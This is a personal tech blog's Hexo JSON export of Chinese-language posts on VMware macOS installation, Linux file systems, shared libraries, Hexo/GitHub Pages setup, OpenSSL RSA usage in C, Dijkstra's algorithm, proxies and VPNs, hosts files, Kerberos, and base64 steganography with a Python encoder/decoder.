{"meta":{"title":"xnightmare's Blog","subtitle":null,"description":null,"author":"xnightmare","url":"http://yoursite.com"},"posts":[{"title":"test.md","slug":"test-md","date":"2023-01-19T09:46:39.000Z","updated":"2023-01-19T09:47:12.399Z","comments":true,"path":"2023/01/19/test-md/","link":"","permalink":"http://yoursite.com/2023/01/19/test-md/","excerpt":"","text":"测试20230119","raw":null,"content":null,"categories":[],"tags":[]},{"title":"VMware15安装macOS10.14虚拟机","slug":"工具/VMware-15-安装-macOS-10-14-虚拟机过程记录","date":"2020-10-31T16:00:00.000Z","updated":"2020-02-02T12:17:24.940Z","comments":true,"path":"2020/11/01/工具/VMware-15-安装-macOS-10-14-虚拟机过程记录/","link":"","permalink":"http://yoursite.com/2020/11/01/%E5%B7%A5%E5%85%B7/VMware-15-%E5%AE%89%E8%A3%85-macOS-10-14-%E8%99%9A%E6%8B%9F%E6%9C%BA%E8%BF%87%E7%A8%8B%E8%AE%B0%E5%BD%95/","excerpt":"","text":"环境：VMware Workstation Pro 15.5.0 build-14665864 Windows 工具：macOS Unlocker V3.0 for VMware WorkstationmacOS镜像：macOS Mojave 10.14 18A391 Lazy Installer.cdr 0x01 解锁VMware安装macOS的选项。正常情况下，VMware是无法创建macOS虚拟机的，需要使用github上的开源项目unlocker进行解锁。 0x02 使用VMware创建虚拟机创建过程和其他虚拟机创建过程基本一致，需要注意的几个点： macOS的镜像格式并不是.iso，而是.sdr，选择镜像的时候要显示所有文件才能看到。 macOS不支持VMware的磁盘格式，所以在安装之前会提示磁盘大小不够（因为此时只有镜像文件这个磁盘），在菜单栏点击【实用工具】-&gt;【磁盘工具】，选择那个你分配给虚拟机的小磁盘，点击【抹掉】（相当于格式化成 macOS 能认出的磁盘） 之后正常配置系统和安装VMware Tools就可以了。 安装后可能会出现icloud无法登录的情况，原因是macOS会对硬件进行检查，防止盗版。","raw":null,"content":null,"categories":[{"name":"工具","slug":"工具","permalink":"http://yoursite.com/categories/%E5%B7%A5%E5%85%B7/"}],"tags":[{"name":"Vmware","slug":"Vmware","permalink":"http://yoursite.com/tags/Vmware/"}]},{"title":"","slug":"计算机网络/TCP三次握手和四次挥手","date":"2020-02-12T12:01:29.998Z","updated":"2020-02-13T16:03:41.029Z","comments":true,"path":"2020/02/12/计算机网络/TCP三次握手和四次挥手/","link":"","permalink":"http://yoursite.com/2020/02/12/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/TCP%E4%B8%89%E6%AC%A1%E6%8F%A1%E6%89%8B%E5%92%8C%E5%9B%9B%E6%AC%A1%E6%8C%A5%E6%89%8B/","excerpt":"","text":"","raw":null,"content":null,"categories":[],"tags":[]},{"title":"Linux文件系统","slug":"Linux/Linux-文件系统","date":"2020-02-06T16:00:00.000Z","updated":"2020-02-07T11:13:11.447Z","comments":true,"path":"2020/02/07/Linux/Linux-文件系统/","link":"","permalink":"http://yoursite.com/2020/02/07/Linux/Linux-%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/","excerpt":"","text":"Linux文件系统实质上，任何信息在硬件中都是一堆二进制数据，而各种文件格式、标准的作用，就是规定了如何将信息变成二进制数据存储，以及如何读取二进制数据并解释成信息。也就是说，各种格式、标准给二进制数据赋予了意义，使其成为信息。 计算机的文件系统是一种存储和组织计算机数据的方法。 为什么要有文件系统？想象没有文件系统的情况下我们如何使用硬盘（或其他存储介质）存储、读取、修改、删除文件。 当我们要写入数据时，我们必须事先记住哪些扇区已经被使用，以访破坏原有的数据。 当我们读取数据时，必须事先记住要读取的数据存储在硬盘的哪些扇区之中。 …… 很明显，这些工作非常繁琐费时，而且容易出错。如果多个人同时使用使用同一块存储介质时，问题会变得更加复杂。更糟糕的是，当文件大小发生变化时，我们可能会面临大量碎片存储空间产生或空间不足的问题，我们又需要一个个去移动文件的位置。当文件数量成千上万，人工去处理这些问题几乎是不可行的。 这样琐碎繁琐的工作应该交给机器完成：人们编写好存储和组织计算机数据的算法，让机器自动完成底层的硬件细节，对上提供易用的接口，这就是文件系统。 文件系统的类型在实际应用中，文件系统并不仅仅用于管理文件，有时候仅仅是一种存取资料的界面，实际的数据可能通过网络协议提供，也可能在内存上，甚至可能根本没有对应的文件（如proc文件系统）。 磁盘文件系统磁盘文件系统是一种设计用来利用数据存储设备来保存计算机文件的文件系统，最常用的数据存储设备是磁盘驱动器，可以直接或者间接地连接到计算机上。 光碟ISO 9660和UDF被用于CD、DVD与蓝光光碟。 闪存文件系统闪存文件系统是一种设计用来在闪存上储存文件的文件系统。尽管磁盘文件系统也能在闪存上使用，但闪存文件系统是闪存设备的首选，理由如下： 擦除区块：闪存的区块在重新写入前必须先进行擦除。擦除区块会占用相当可观的时间。因此，在设备空闲的时候擦除未使用的区块有助于提高速度，而写入数据时也可以优先使用已经擦除的区块。 随机访问：由于在磁盘上寻址有很大的延迟，磁盘文件系统有针对寻址的优化，以尽量避免寻址。但闪存没有寻址延迟。 写入平衡（Wear levelling）：闪存中经常写入的区块往往容易损坏。闪存文件系统的设计可以使数据均匀地写到整个设备。 数据库文件系统文件管理方面的一个新概念是一种基于数据库的文件系统的概念。不再（或者不仅仅）使用分层结构管理，文件按照他们的特征进行区分，如文件类型、专题、作者或者亚数据进行区分。于是文件检索就可以按照SQL风格甚至自然语言风格进行。 网络文件系统网络文件系统（NFS，Network File System）是一种将远程主机上的分区（目录）经网络挂载到本地系统的一种机制。","raw":null,"content":null,"categories":[{"name":"Linux","slug":"Linux","permalink":"http://yoursite.com/categories/Linux/"}],"tags":[]},{"title":"中断","slug":"计算机组成原理及体系结构/软中断和硬中断","date":"2020-02-05T16:00:00.000Z","updated":"2020-02-06T13:37:29.035Z","comments":true,"path":"2020/02/06/计算机组成原理及体系结构/软中断和硬中断/","link":"","permalink":"http://yoursite.com/2020/02/06/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86%E5%8F%8A%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/%E8%BD%AF%E4%B8%AD%E6%96%AD%E5%92%8C%E7%A1%AC%E4%B8%AD%E6%96%AD/","excerpt":"","text":"中断：在计算机科学中，中断（Interrput）是指处理器收到来自硬件或软件的信号，提示发生了某个事件，需要被注意。 中断可以分为硬中断和软中断两种： 硬中断：硬件中断，由硬件产生 软中断：软件中断，由软件的中断指令产生 中断的作用： 在实时系统中，对紧急的任务及时响应。 充分利用CPU资源。因为CPU的速度比外设、内存等都要快得多，因此CPU在等待时可以先去执行其他任务，等处理完成之后外设、内存等发送中断信号给处理器，处理器再回过头获取处理结果。 中断处理过程： 保存上下文。 执行中断处理程序。 恢复上下文，继续执行原程序。","raw":null,"content":null,"categories":[{"name":"计算机组成原理与体系结构","slug":"计算机组成原理与体系结构","permalink":"http://yoursite.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86%E4%B8%8E%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/"}],"tags":[]},{"title":"Linux编译并使用共享库","slug":"Linux/Linux编译生成并使用共享库","date":"2020-02-02T14:22:33.000Z","updated":"2020-02-02T13:32:03.180Z","comments":true,"path":"2020/02/02/Linux/Linux编译生成并使用共享库/","link":"","permalink":"http://yoursite.com/2020/02/02/Linux/Linux%E7%BC%96%E8%AF%91%E7%94%9F%E6%88%90%E5%B9%B6%E4%BD%BF%E7%94%A8%E5%85%B1%E4%BA%AB%E5%BA%93/","excerpt":"","text":"Linux编译生成并使用共享库共享库实际上就是将一些函数编译成可执行文件，以供其他程序调用。 生成共享库1234gcc -shared -fPIC -I ../../include -o libclient.so client.c hardware_id.c opts.c rsa_client.c# -shared 告诉gcc输出共享库# -fPIC 告诉GCC产生的代码不要包含对函数和变量具体内存位置的引用，这是因为现在还无法知道使用该消息代码的应用程序会将它连接到哪一段内存地址空间。这样编译出的.o文件可以被用于建立共享链接库# 每个共享函数库都有个特殊的名字，称作“soname”。soname名字命名必须以“lib”作为前缀，然后是函数库的名字，然后是“.so”，最后是版本号信息。不过有个特例，就是非常底层的C库函数都不是以lib开头这样命名的。 使用共享库 编写代码时，在头文件中给出函数的声明。 编译选项中要给出包含对应函数实现的共享库。 12gcc test.c -o test -L. -lclient -lssl# -L . 表示共享库文件可能在当前工作目录下 执行时要保证在lib路径下能够找到共享库。 临时的方法： 1export LD_LIBRARY_PATH = $(pwd) 永久有效的方法： 1链接 或 复制到共享库目录下 Tips：可以使用命令ldd ./exectuable来查看可执行文件依赖的共享库。","raw":null,"content":null,"categories":[{"name":"Linux","slug":"Linux","permalink":"http://yoursite.com/categories/Linux/"}],"tags":[{"name":"编译","slug":"编译","permalink":"http://yoursite.com/tags/%E7%BC%96%E8%AF%91/"}]},{"title":"Github Pages + Hexo搭建个人博客","slug":"工具/Github Pages + Hexo搭建个人博客","date":"2020-02-02T06:17:30.000Z","updated":"2020-02-12T10:01:49.666Z","comments":true,"path":"2020/02/02/工具/Github Pages + Hexo搭建个人博客/","link":"","permalink":"http://yoursite.com/2020/02/02/%E5%B7%A5%E5%85%B7/Github%20Pages%20+%20Hexo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/","excerpt":"","text":"搭建个人博客，首先需要生成个人博客的网站代码，然后将网站代码部署到服务器上使外界能够访问。我选择Hexo生成网站代码，然后利用Github Pages部署网站。 环境：Windows 10 01 使用Hexo生成静态网站Hexo是一款基于Node.js的静态博客框架，具有快速、简洁、高效等特点。Hexo 使用 Markdown（或其他渲染引擎）解析文章，在几秒内，即可利用靓丽的主题生成静态网页。 1.1 安装Hexo安装Hexo之前，需要先安装Node.js和Git。 1.1.1 安装Node.js去官网下载安装即可，安装完成之后打开命令行提示符输入以下命令测试是否安装成功： 12node -vnpm -v 1.1.2 安装Git去官网下载安装即可，安装完成之后打开命令行提示符输入以下命令测试是否安装成功： 1git --version 在这里，我省略了向Github添加用户SSH公钥的步骤，因为这是使用Git向Github推送代码的通用步骤。 1.1.3 安装Hexo12npm install hexo-cli -g # -g 表示全局安装 1.2 初始化Hexo用$prefix表示用户存放博客的目录 12cd $prefix/bloghexo init 这个时候，博客的雏形就已经完成了，我们可以通过命令hexo server（可简写为hexo s）部署在本地，然后在浏览器地址栏输入localhost:4000查看效果。 1.3 写博客文章并生成网站代码使用命令hexo new filename会以$prefix&#x2F;blog&#x2F;scaffolds&#x2F;post.md为模板，在$prefix&#x2F;blog&#x2F;source&#x2F;_posts目录下生成文件filename.md。 在filename.md中加入博客内容后，使用命令hexo g（generate）便会在$prefix&#x2F;blog&#x2F;public目录下生成新的网站代码，同样可以用hexo s命令在本地查看效果。 02 使用Github Pages部署网站Github Pages是Github提供的静态网站托管服务（官方文档），有三种类型： 项目网站：对应于一个托管在Github上的项目，每个Github账户能够创建的项目网站不受限。 用户网站：数据存储在名为$username.github.io的仓库中，通过域名$username.github.io进行访问，每个Github账户只能创建一个。 组织网站：数据存储在名为$organization.github.io的仓库中，每个Github账户只能创建一个。 这里我们使用的是用户网站类型的Github Pages。 2.1 创建Github Pages仓库创建一个名为$username.github.io的仓库。 2.2 配置Hexo部署方式和部署地址编辑文件$prefix&#x2F;blog&#x2F;_config.yml。 1234# Deployment## Docs: https://hexo.io/docs/deployment.htmldeploy: type: &#x27;&#x27; 修改为 123456# Deployment## Docs: https://hexo.io/docs/deployment.htmldeploy: type: git repo: git@github.com:$username/$username.github.io.git branch: master 2.3 安装插件使Hexo能够调用Git1npm install hexo-deployer-git 2.4 将网站代码部署到Github仓库1hexo d 或 hexo deploy 2.5 访问Github Pages如果你顺利完成了之前的步骤，现在你就可以在浏览器地址栏中输入$username.github.io访问你的博客了！ 03 个性化配置博客3.1 Hexo常用配置在配置文件$prefix&#x2F;blog&#x2F;_config.yml中你可以对Hexo的大部分属性进行配置，包括网站的标题、副标题、描述、语言、时区等，具体请参考Hexo配置文档 3.2 Hexo配置主题3.2.1 下载主题在Github上有很多关于Hexo的主题，可以在Hexo官网，知乎-有哪些好看的 Hexo 主题？等地方寻找自己想要的主题，然后下载到本地： 123cd $prefix/blog# 用yilia主题举例git clone git@github.com:litten/hexo-theme-yilia.git themes/yilia 3.2.2 配置主题在配置文件$prefix&#x2F;blog&#x2F;_config.yml中设置主题为刚刚下载的主题，例如： 1theme: yilia 之后重新生成并部署网站就可以了。 3.3 自定义域名3.3.1 Github Pages配置通过自定义域名访问在Github Pages的仓库的设置中，可以设置Custom domain，配置之后会在该仓库根目录下创建一个名为CNAME的文件，文件内容为自定义域名（如abc.com）。这样做有两个效果： 当你用自定义域名访问Github Pages时，Github Pages可以通过CNAME文件中的记录找到对应的页面。 访问$username&#x2F;github.io会重定向到自定义域名。 直接在网页上配置存在一个问题：下次更新仓库的时候，CNAME文件就会被删除，又需要重新配置。解决方法是把CNAME文件放到$prefix&#x2F;blog&#x2F;source目录下。 3.3.2 域名配置DNS为自己的域名增加一条CNAME记录，指向域名$username&#x2F;github.io。 经过以上两步，就可以通过自定义域名访问自己的博客了。","raw":null,"content":null,"categories":[{"name":"工具","slug":"工具","permalink":"http://yoursite.com/categories/%E5%B7%A5%E5%85%B7/"}],"tags":[{"name":"Github Pages","slug":"Github-Pages","permalink":"http://yoursite.com/tags/Github-Pages/"},{"name":"Hexo","slug":"Hexo","permalink":"http://yoursite.com/tags/Hexo/"}]},{"title":"OpenSSL RSA基本操作（命令行和C语言）","slug":"密码学/OpenSSL RSA基本操作（命令行和C语言）","date":"2020-02-01T16:00:00.000Z","updated":"2020-02-02T13:08:33.443Z","comments":true,"path":"2020/02/02/密码学/OpenSSL RSA基本操作（命令行和C语言）/","link":"","permalink":"http://yoursite.com/2020/02/02/%E5%AF%86%E7%A0%81%E5%AD%A6/OpenSSL%20RSA%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C%EF%BC%88%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%92%8CC%E8%AF%AD%E8%A8%80%EF%BC%89/","excerpt":"","text":"命令行密钥对生成12openssl genrsa -out pri.key 2048openssl rsa -in pri.key -pubout &gt; pub.key 公钥加密、私钥解密1234openssl rsautl -encrypt -in hello -inkey test_pub.key -pubin -out hello.en # -in指定要加密的文件，-inkey指定密钥，-pubin表明是用纯公钥文件加密，-out为加密后的文件。openssl rsautl -decrypt -in hello.en -inkey test.key -out hello.de# -in指定被加密的文件，-inkey指定私钥文件，-out为解密后的文件 私钥签名、公钥验证123openssl rsautl -sign -in plain.txt -inkey RSA.pem -passin pass:123456 -out sign.txtopenssl rsautl -verify -in sign.txt -inkey RSA.pem -passin pass:123456 -out replain.txt# 实际上使用私钥加密、公钥解密 C语言从文件中读取密钥1234567891011121314151617// 从文件中读取公钥RSA * get_pubkey_from_file(unsigned char *key)&#123; RSA *p_rsa; FILE *fp_key; fp_key = fopen(key, &quot;rb&quot;); p_rsa = PEM_read_RSA_PUBKEY(fp_key, NULL, NULL, NULL); return p_rsa;&#125;// 从文件中读取私钥RSA * get_prikey_from_file(unsigned char *key)&#123; RSA *p_rsa; FILE *fp_key; fp_key = fopen(key, &quot;rb&quot;); p_rsa = PEM_read_RSAPrivateKey(fp_key, NULL, NULL, NULL); return p_rsa;&#125; 加密RSA加密需要进行分组加密，分组的长度与密钥长度有关，比如当密钥长度为2048 bit时，分组的长度就为256 bytes（输入为256字节，输出也为256字节，因此密文长度一定为256字节的倍数）。 加密的时候还要考虑到padding的影响，不同padding方式实际每组能够加密的长度不同。 123456789101112131415161718192021222324int private_key_encrypt(unsigned char *data, int data_len, RSA * key, FILE * fp)&#123; int rsa_len = RSA_size(key); char *buf = malloc(rsa_len + 1); memset(buf, 0, rsa_len+1); RSA_private_encrypt(data_len, data, buf, key, RSA_PKCS1_PADDING); fwrite(buf, 1, rsa_len, fp); free(buf); return 0;&#125;// 私钥加密的核心代码，公钥加密的逻辑是相同的，仅仅是调用的加密函数不同（RSA_private_encrypt换成RSA_public_encrypt）RSA * p_rsa = get_prikey_from_file(key);int rsa_len = RSA_size(p_rsa);int len = strlen(plain);int data_len = rsa_len - 11;int num = len / data_len;FILE * fp_out = fopen(outfile, &quot;w&quot;);char * off_plain = plain;while(num--)&#123; private_key_encrypt(off_plain, data_len, p_rsa, fp_out); off_plain += data_len;&#125;private_key_encrypt(off_plain, len%data_len, p_rsa, fp_out);fclose(fp_out); 解密上面已经提到过，当密钥长度为2048 bit时，密文的长度一定为256字节的倍数。因此，解密时只要以256字节为单位，依次解密，然后将结果拼起来就可以了。 12345678910111213// 私钥解密的核心代码，公钥解密的逻辑是相同的，仅仅是调用的加密函数不同（RSA_private_decrypt换成RSA_public_decrypt）RSA * p_rsa;p_rsa = get_prikey_from_file(key);int rsa_len = RSA_size(p_rsa);int num = len / rsa_len;char * off_en = en;char buf[rsa_len + 1];while(num--)&#123; memset(buf, 0, rsa_len+1); RSA_private_decrypt(rsa_len, off_en, buf, p_rsa, RSA_PKCS1_PADDING); strcat(plain, buf); off_en += rsa_len;&#125;","raw":null,"content":null,"categories":[{"name":"密码学","slug":"密码学","permalink":"http://yoursite.com/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/"}],"tags":[{"name":"OpenSSL","slug":"OpenSSL","permalink":"http://yoursite.com/tags/OpenSSL/"}]},{"title":"Dijkstra算法","slug":"算法/Dijkstra算法","date":"2020-02-01T16:00:00.000Z","updated":"2020-02-02T12:24:03.223Z","comments":true,"path":"2020/02/02/算法/Dijkstra算法/","link":"","permalink":"http://yoursite.com/2020/02/02/%E7%AE%97%E6%B3%95/Dijkstra%E7%AE%97%E6%B3%95/","excerpt":"","text":"Dijkstra算法是一种最短路径算法。 输入：图的信息（包括结点、边以及边的权重），起点。 输出：起点到图中其他所有点的最短路径（包括长度和具体路径）。 算法： 初始化： 最短距离表：起点的最短距离为0，其他所有结点的最短距离为INF。 集合A：空集。 集合B：包含所有结点。 查找最短距离表中距离数值最小的结点，执行操作： 将该结点从集合B移动到集合A。 更新与该结点相邻并在集合B中的所有结点的最短距离值。 重复步骤2，直到集合B为空。 正确性证明： 在以上算法的描述中，将结点移到集合A代表已经找到了起点到该结点的最短路径，只要证明这个路径确实是最短路径，就可以说明Dijkstra算法是正确的。 我们可以将所有结点分为三类：已经找到了最短路径的点（称为X类结点），找到了路径但不一定时最短路径的结点（称为Y类结点）、还未找到路径的结点（称为Z类结点）。 第一次循环时，X类结点只有起点，和起点相邻的所有结点为Y类结点，其他所有结点为Z类结点。如果找到的路径不是最短路径，那么必定存在一条路径，经过某个Y类结点（因为经过X类结点的所有路径已经考虑过），然后到达该结点，而这条结点应该是大于它经过的Y类结点到起点的距离的，而找到的路径距离又是Y类结点到起点距离的最小值，两相矛盾，反证结束。","raw":null,"content":null,"categories":[{"name":"算法","slug":"算法","permalink":"http://yoursite.com/categories/%E7%AE%97%E6%B3%95/"}],"tags":[]},{"title":"hosts文件","slug":"计算机网络/Proxy和VPN的区别","date":"2020-02-01T16:00:00.000Z","updated":"2020-02-02T12:35:54.234Z","comments":true,"path":"2020/02/02/计算机网络/Proxy和VPN的区别/","link":"","permalink":"http://yoursite.com/2020/02/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/Proxy%E5%92%8CVPN%E7%9A%84%E5%8C%BA%E5%88%AB/","excerpt":"","text":"首先分别简单介绍Proxy和VPN。 Proxy客户端不直接访问服务器，而是先将请求发送给一个中间实体——代理服务器，代理服务器代替客户端向服务器发起请求，然后将结果返回给客户端。 代理分为正向代理和反向代理两种： 正向代理为客户端提供服务，对服务端透明。 作用： 访问无法访问的网络 记录上网记录 匿名 访问控制 反向代理为服务器提供服务，对客户端透明。因为这种代理方式和先出现的代理方式正好相反，因此称之为反向代理。 作用： 负载均衡 节省公网IP 保护内网IP 缓存以加快访问速度 VPN本质上是一种安全通信的协议，分为两种： 和登录节点建立隧道，从而访问秘密资源 和另一个局域网建立隧道 总结从上面的介绍可以看出： Proxy和VPN被设计出来的目的是不同的：正向代理主要用于匿名，VPN主要用于建立安全网络连接。 当VPN用于和登录节点建立隧道时，和正向代理的作用其实是类似的，只是因为需求不同侧重点会有所不同。","raw":null,"content":null,"categories":[{"name":"计算机网络","slug":"计算机网络","permalink":"http://yoursite.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"}],"tags":[]},{"title":"hosts文件","slug":"计算机网络/hosts文件","date":"2020-02-01T16:00:00.000Z","updated":"2020-02-02T12:34:33.906Z","comments":true,"path":"2020/02/02/计算机网络/hosts文件/","link":"","permalink":"http://yoursite.com/2020/02/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/hosts%E6%96%87%E4%BB%B6/","excerpt":"","text":"域名解析文件，内容是域名和IP的映射表。 在互联网上，使用IP标识每台机器的身份，但是IP地址不适合人类记忆，所以人们发明了域名（一串有意义的字符串），但这样又引入了将域名翻译成对应IP的问题。 早期网络规模比较小，通过hosts文件将域名和IP地址对应起来。后来网络规模不断扩大，hosts文件的维护变得非常困难，于是又发明了DNS服务，hosts文件则成为了一个备用的域名解析手段。 现在hosts文件仍然有其作用： 强制将域名指向某IP： 指向错误的IP，过滤广告网站，节省流量；阻止软件在线验证版权；拦截网站的恶意请求； 指向正确的IP 减少对DNS服务器的访问","raw":null,"content":null,"categories":[{"name":"计算机网络","slug":"计算机网络","permalink":"http://yoursite.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"}],"tags":[]},{"title":"机器语言、汇编语言和高级语言","slug":"计算机组成原理及体系结构/机器语言、汇编语言和高级语言","date":"2020-02-01T16:00:00.000Z","updated":"2020-02-02T12:18:49.711Z","comments":true,"path":"2020/02/02/计算机组成原理及体系结构/机器语言、汇编语言和高级语言/","link":"","permalink":"http://yoursite.com/2020/02/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86%E5%8F%8A%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/%E6%9C%BA%E5%99%A8%E8%AF%AD%E8%A8%80%E3%80%81%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%92%8C%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80/","excerpt":"","text":"计算机是通过一系列高低电平驱动电子器件运算的，我们用一系列二进制数字来表示高低电平，这些二进制数字就称为机器语言。 一个最简单的程序如输出字符串都需要上百个二进制数字表示，显然，使用机器语言编写程序是非常繁琐的，并且难以辨析和记忆，于是人们又发明了汇编语言。 汇编语言实际上可以认为是机器语言的一种表示方法——将二进制数字翻译成人类方便理解的字符串，方便人们编程。 但是汇编语言仍然存在一些问题： 程序可移植性差，因为不同型号的cpu支持的汇编语法是不同的。 需要自己处理硬件问题：比如寄存器、栈、堆等。 因此，人们又发明了高级语言，屏蔽了硬件细节，使编程人员能够集中精力处理程序逻辑方面的问题而不需要考虑硬件细节。时至今日，世界上有超过1000种编程语言（TIOBE 编程语言排行榜中列出了活跃度最高的50种语言）。一方面，随着时代的发展，一些语言慢慢被淘汰，一些具备新特性的语言不断出现；另一方面，不同的领域需求不同，适用的语言也不同。","raw":null,"content":null,"categories":[{"name":"计算机组成原理与体系结构","slug":"计算机组成原理与体系结构","permalink":"http://yoursite.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86%E4%B8%8E%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/"}],"tags":[{"name":"汇编语言","slug":"汇编语言","permalink":"http://yoursite.com/tags/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/"}]},{"title":"Kerberos协议","slug":"计算机网络/Kerberos协议","date":"2019-12-26T09:26:46.000Z","updated":"2020-02-02T12:34:59.754Z","comments":true,"path":"2019/12/26/计算机网络/Kerberos协议/","link":"","permalink":"http://yoursite.com/2019/12/26/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/Kerberos%E5%8D%8F%E8%AE%AE/","excerpt":"","text":"简介由MIT设计的开源的网络认证协议。它的作用是实现在一个开放的分布式环境中，工作站的用户和服务器能够进行双向认证。 为什么要进行双向认证？ 如果不认证工作站的身份，那么用户信息的机密性、完整性、不可抵赖性都将受到威胁。例如攻击者可以查看、修改、删除任意用户的文件，攻击者可以假冒任意用户请求服务。如果不认证服务器的身份，那么攻击者可以假冒服务器，窃取客户的敏感信息。 分析——从简单到具体建议先看维基百科和其他介绍了具体流程的博客。下面是按照自己的理解从简单到复杂不断扩展Kerberos，便于说明每个部分的作用。 版本1每个用户都有自己的用户名和密码，通过向服务器发送自己的用户名密码进行认证。 存在的问题： 用户名和密码明文传输，非常容易被窃听。 每个服务器都需要维护所有用户的信息。 版本2用零知识证明的方式解决密码明文传输的问题。用户向服务器发送自己的用户名，服务器在数据库中查找到对应的密码，然后用密码加密信息发送给用户，如果用户能够解密该信息，就能够证明用户的身份。 引入可信第三方AS解决用户信息维护的问题。AS中保存了所有的用户信息，用户想要请求服务之前，先向AS证明自己的身份，AS审核通过之后发给用户一个Ticket（客户ID，用SS的密钥加密），用户可以用这个Ticket向SS证明自己的身份。 存在的问题： 用户每次访问一个新的服务都需要输入用户名和密码申请新的Ticket，对用户不友好。 Ticket容易被攻击者窃听，进行重放攻击。 版本3引入TGS解决多次输入用户名和密码的问题。用户通过AS认证身份，AS审核通过后发给用户TGT，用户通过TGT向TGS证明自己的身份，TGS审核通过之后再给用户发送Ticket，使用Ticket访问服务，这样在用户的一次登陆过程中，只需要输入一次用户名和密码。 引入Ticket有效期和address加大攻击的难度。审核用户身份时还检查Ticket是否过期以及address是否正确。引入session key和Authenticator防御重放攻击。客户和TGS或SS之间都维护session key（TGS的session key由AS分配，SS的session key由TGS分配），用session key加密服务器和用户信息生成Authenticator，攻击者没有session key，无法生成正确的Authenticator，通过有效期和缓存机制保证Authenticator只能在一定时间内使用一次，保证攻击者无法通过重放假冒其他用户的身份。 参考资料http://web.mit.edu/kerberos/dialogue.html","raw":null,"content":null,"categories":[{"name":"计算机网络","slug":"计算机网络","permalink":"http://yoursite.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"}],"tags":[]},{"title":"base64隐写","slug":"CTF/MISC/base64隐写","date":"2019-12-26T02:34:31.000Z","updated":"2020-02-02T12:17:13.881Z","comments":true,"path":"2019/12/26/CTF/MISC/base64隐写/","link":"","permalink":"http://yoursite.com/2019/12/26/CTF/MISC/base64%E9%9A%90%E5%86%99/","excerpt":"","text":"Base64编码的原理Base64时一种基于64个可打印字符表示二进制数据的表示方法，其一大特点是能够将不可打印字符编码为可打印字符。 Base64使用的64个可打印字符及其索引如下表： 简单来说，就是A-Za-z0-9+&#x2F;这64个可打印字符。 编码时，将要编码的内容转换为二进制数据，每6位作为一组，从表中找到对应的字符。因为ASCII编码8位表示一个字符，3个ASCII刚好可以编码成4个字符（38&#x3D;46），因此一般以3个ASCII字符为一个编码的基本单位： 但需要编码的文本字节数并不总是3的倍数，不可避免会遇见最后只剩下2个或1个字符的情况，需要特殊处理： %3&#x3D;2的情况： %3&#x3D;1的情况： Base64隐写的原理从Base64编码的原理我们很自然推出Base解码的过程： 丢掉末尾的所有‘&#x3D;’； 每个字符查表转换为对应的6位索引，得到一串二进制字符串； 从头开始，每次取8位转换为对应的ASCII字符，如果不足8位则丢弃。 Base64编码和解码脚本如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243table = &#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;def inttobin(a, n): res = bin(a)[2:] while len(res) &lt; n: res = &#x27;0&#x27; + res return resdef b64encode(strin): res = &#x27;&#x27; quotient = len(strin)/3 remainder = len(strin)%3 for i in range(quotient): tmp = strin[i*3:i*3+3] tmpbin = inttobin(ord(tmp[0]), 8) + inttobin(ord(tmp[1]), 8) + inttobin(ord(tmp[2]), 8) print tmpbin for j in range(4): index = int(tmpbin[6*j:6*j+6], 2) res += table[index] if remainder == 1: tmpbin = inttobin(ord(strin[-1]), 8) + &#x27;0000&#x27; res += table[int(tmpbin[:6], 2)] res += table[int(tmpbin[6:], 2)] res += &#x27;==&#x27; elif remainder == 2: tmpbin = inttobin(ord(strin[-2]), 8) + inttobin(ord(strin[-1]), 8) + &#x27;00&#x27; res += table[int(tmpbin[:6], 2)] res += table[int(tmpbin[6:12], 2)] res += table[int(tmpbin[12:], 2)] res += &#x27;=&#x27; return resdef b64decode(strin): res = &#x27;&#x27; while strin[-1] == &#x27;=&#x27;: strin = strin[:-1] tmpbin = &#x27;&#x27; for i in range(len(strin)): tmpbin += inttobin(table.index(strin[i]), 6) remainder = len(tmpbin) / 8 for i in range(remainder): res += chr(int(tmpbin[i*8:i*8+8], 2)) return res 在解码的第3步中，会有部分数据被丢弃（即不会影响解码结果），这些数据正是我们在编码过程中补的0。也就是说，如果我们在编码过程中不用0填充，而是用其他的数据填充，仍然可以正常编码解码，而这些位置便可以用于隐写。 